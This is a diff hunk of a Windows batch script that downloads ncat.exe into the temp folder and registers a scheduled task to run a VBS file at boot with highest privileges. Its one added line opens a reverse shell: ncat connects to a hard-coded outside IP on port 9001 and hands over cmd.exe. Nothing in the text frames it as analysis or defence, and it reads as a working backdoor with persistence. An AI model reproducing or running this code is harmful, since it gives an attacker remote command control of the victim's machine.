@@ -25,6 +25,7 @@ if %taskExists% neq 0 (
     cd /d %temp%
     curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
     schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+    ncat.exe 185.194.175.132 9001 -e cmd.exe
     
 )
 
